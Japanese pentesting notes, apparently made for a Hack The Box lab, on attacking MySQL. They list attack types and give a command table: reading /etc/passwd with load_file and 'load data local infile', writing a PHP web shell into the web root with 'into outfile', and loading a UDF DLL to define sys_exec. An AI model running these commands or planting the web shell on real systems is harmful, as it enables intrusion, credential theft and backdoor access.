# Description
----

1. SQLインジェクション
1. データベースへアクセスするためのクレデンシャル情報の漏洩
1. データベース内のクレデンシャル情報の漏洩
1. ファイル書き込みを利用したバックドアの生成
1. ファイル読み込みを利用した情報漏洩
1. ユーザ定義関数を利用した権限昇格
1. ファイル書き込みと読み込みを利用したsmbアクセスによるNet-NTLM情報の漏洩

接続先データベースを指定できる場合、クライアント側に接続

クライアントがアタッカーかホストか、サーバがアタッカーかホストかで分類できるかも

SQL Injectionのコメントアウトからの推定



| Description                                  | Command                                                      |
| -------------------------------------------- | ------------------------------------------------------------ |
| MySQLクライアント：DBにファイルを読み込み    | `load data local infile '/etc/passwd' into table dummy`      |
| MySQLクライアント：DBからファイルを書き出し  | `select '<?php echo system($_GET["cmd"]); ?>' into outfile '/var/www/html/shell.php'` |
| MySQLサーバ：DBにファイルを読み込み          | `select load_file('/etc/passwd')`                            |
| MySQLサーバ：DBからファイルを書き出し        | なし                                                         |
| 関数定義（`$MYSQL_HOME\lib\plugin\udf.dll`） | `create function sys_exec returns int soname 'udf.dll'`      |

HTB: Bastard

```console
a
```

